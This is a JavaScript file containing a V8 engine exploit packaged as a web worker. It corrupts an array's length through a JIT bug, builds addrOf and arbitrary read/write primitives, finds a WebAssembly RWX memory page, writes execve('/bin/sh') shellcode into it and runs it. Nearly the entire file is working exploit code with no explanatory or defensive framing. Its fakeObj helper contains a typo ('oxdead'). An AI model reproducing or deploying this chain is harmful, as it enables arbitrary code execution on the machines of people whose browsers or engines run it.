function exploit(addr){
    // tookits
    var buf =new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    var uint32 = new Uint32Array(buf);
    // Floating point to 64-bit unsigned integer
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64-bit unsigned integer to Floating point
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }

    function f2half(val)
    {
        float64[0]= val;
        let tmp = Array.from(uint32);
        return tmp;
    }

    function half2f(val)
    {
        uint32.set(val);
        return float64[0];
    }
    // 64-bit unsigned integer to hex
    function hex(i)
    {
        return "0x"+i.toString(16).padStart(16, "0");
    }


    //////// begin exploit....

    var maxSize = 0x10 * 0x1000;


    array = Array(0x40000).fill(1.1);
    args = Array(0x100 - 1).fill(array);
    args.push(Array(0x40000 - 4).fill(2.2));
    giant_array = Array.prototype.concat.apply([], args);
    giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

    length_as_double =
        new Float64Array(new BigUint64Array([0x2424242459590001n]).buffer)[0];

    function trigger(array) {
      var x = array.length;
      x -= 67108861;
      x = Math.max(x, 0);
      x *= 6;
      x -= 5;
      x = Math.max(x, 0);

      let corrupting_array = [0.1, 0.1];
      let corrupted_array = [0.1];

      corrupting_array[x] = length_as_double;
      return [corrupting_array, corrupted_array];
    }

    for (let i = 0; i < 30000; ++i) {
      trigger(giant_array);
    }



    corrupted_array = trigger(giant_array)[1];
    console.log('[+] corrupted array length: ' + corrupted_array.length.toString(16));


    var leak_obj = {m:0xdead, n:{}}; 
    var big_uint_array = new BigUint64Array(6);
    big_uint_array[0] = 0x1234n;
    big_uint_array[1] = 0x4567n;


    var floatArrayBigLenIdx = 0;
    var floatArrayBigBaseIdx = 0;
    var floatArrayBigExternalIdx = 0;


    %DebugPrint(big_uint_array);


    for(var i = 0; i < maxSize; i++){
        // console.log(hex(f2i(corrupted_array[i])));
        if(f2i(corrupted_array[i]) == 0x1234){
            console.log("find our BigUint64Array");
            floatArrayBigBaseIdx = i + 12;
            floatArrayBigExternalIdx = i + 11;
            floatArrayBigLenIdx = i+10;
            console.log("[+] float idx of big uint array base addr is: "+hex(floatArrayBigBaseIdx));
            console.log("[+] float idx of big uint array external addr is: "+hex(floatArrayBigExternalIdx));
            break;
        }
    }

    if(floatArrayBigLenIdx == 0 || floatArrayBigBaseIdx==0 || floatArrayBigExternalIdx==0) throw "[!] find error";

    var bigUintArrayLen = f2i(corrupted_array[floatArrayBigLenIdx]);
    var bigUintArrayBasePtr = f2i(corrupted_array[floatArrayBigBaseIdx]);
    var bigUintArrayExternalPtr = f2i(corrupted_array[floatArrayBigExternalIdx]);

    console.log("[+] bigUintArrayLen : " + hex(bigUintArrayLen));
    console.log("[+] bigUintArrayBasePtr : " + hex(bigUintArrayBasePtr));
    console.log("[+] bigUintArrayExternalPtr : " + hex(bigUintArrayExternalPtr));

    var compressHeapHighAddr = BigInt(bigUintArrayExternalPtr) & 0xffffffff00000000n;
    console.log("[+] compressHeapHighAddr : " + hex(compressHeapHighAddr));




    function addrOf(obj){
        leak_obj.n = obj;
        for(let i=0; i<maxSize; i++) {
            let half = f2half(corrupted_array[i]);
            if( half[0] == (0xdead<<1) ) {
                ret = half[1];
                break;
            }
            else if( half[1] == (0xdead<<1) ) {
                ret = f2half(corrupted_array[i+1])[0];
                break;
            }
        }

        return BigInt(ret);
    }

    function fakeObj(addr){
        for(let i=0; i<maxSize; i++) {
            let half = f2half(corrupted_array[i]);
            if(half[0] == (oxdead<<1)) {
                half[1] = addr;
                corrupted_array[i] = half2f(half);
                return objArray.n;
            }
            else if(half[1] == (0xdead<<1)) {
                half = f2half(corrupted_array[i+1]);
                half[0] = addr;
                corrupted_array[i+1] = half2f(half);
                return objArray.n;
            }
        } 
    }

    function read64(addr){
        corrupted_array[floatArrayBigBaseIdx] = i2f(addr-0x8n);
        let ret = big_uint_array[0];
        corrupted_array[floatArrayBigBaseIdx] = i2f(bigUintArrayBasePtr);
        return ret;

    }

    function write64(addr, val){
        // console.log(hex(addr));
        corrupted_array[floatArrayBigExternalIdx] = i2f(addr);
        corrupted_array[floatArrayBigBaseIdx] = i2f(0n);
        // console.log(hex(f2i(corrupted_array[floatArrayBigExternalIdx]) + f2i(corrupted_array[floatArrayBigBaseIdx])));
        big_uint_array[0] = val;
        corrupted_array[floatArrayBigExternalIdx] = i2f(bigUintArrayExternalPtr);
        corrupted_array[floatArrayBigBaseIdx] = i2f(bigUintArrayBasePtr);
        return;
    }


    function ByteToBigIntArray(payload){

        let sc = []
        let tmp = 0n;
        let lenInt = BigInt(Math.floor(payload.length/8))
        for (let i = 0n; i < lenInt; i += 1n) {
            tmp = 0n;
            for(let j=0n; j<8n; j++){
                tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
            }
            sc.push(tmp);
        }

        let len = payload.length%8;
        tmp = 0n;
        for(let i=0n; i<len; i++){
            tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
        }
        sc.push(tmp);
        return sc;
    }


    function ArbitratyWrite(addr, payload){

        sc = ByteToBigIntArray(payload);

        corrupted_array[floatArrayBigLenIdx] = i2f(BigInt(sc.length));
        corrupted_array[floatArrayBigBaseIdx] = i2f(0n);
        corrupted_array[floatArrayBigExternalIdx] = i2f(addr);
        for(let i = 0; i<sc.length; i+=1) {
            big_uint_array[i] = sc[i];
        }

        corrupted_array[floatArrayBigLenIdx] = bigUintArrayLen;
        corrupted_array[floatArrayBigBaseIdx] = bigUintArrayBasePtr;
        corrupted_array[floatArrayBigExternalIdx] = bigUintArrayExternalPtr;
    }




    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1,
    127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0,
    1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2,
    0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 10, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var func = wasmInstance.exports.main;

    // %DebugPrint(func);

    let wasm_func_addr = addrOf(func) + compressHeapHighAddr;
    console.log("[+] wasm func addr : " + hex(wasm_func_addr));
    let shared_info_addr = read64(wasm_func_addr + 0xcn) & 0xffffffffn;
    console.log("[+] shared info : " + hex(shared_info_addr + compressHeapHighAddr));
    let wasm_export_func_addr = read64(shared_info_addr + compressHeapHighAddr + 0x4n) & 0xffffffffn;
    console.log("[+] wasm_export_func_addr : " + hex(wasm_export_func_addr + compressHeapHighAddr));
    let instance_addr = read64(wasm_export_func_addr + compressHeapHighAddr + 8n) & 0xffffffffn;
    console.log("[+] instance_addr : " + hex(instance_addr + compressHeapHighAddr));
    let rwx_addr = read64(instance_addr + compressHeapHighAddr + 0x68n);
    console.log("[+] rwx_addr : " + hex(rwx_addr));



    var shellcode = [0x6a,0x3b,0x58,0x99,0x52,0x48,0xbb,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x53,0x54,0x5f,0x52,0x57,0x54,0x5e,0xf,0x5];


    ArbitratyWrite(rwx_addr, shellcode);

    console.log("[+] run shellcode plz")

    func();

}



onmessage = (e) => {
  console.log("[+] in exp.js");
  console.log("[+] exploit addr : " + e.data.toString(16));
  try{
    exploit(BigInt(e.data));
    postMessage(true);
  }catch(e){
    console.log(e);
    postMessage(false);
  }
}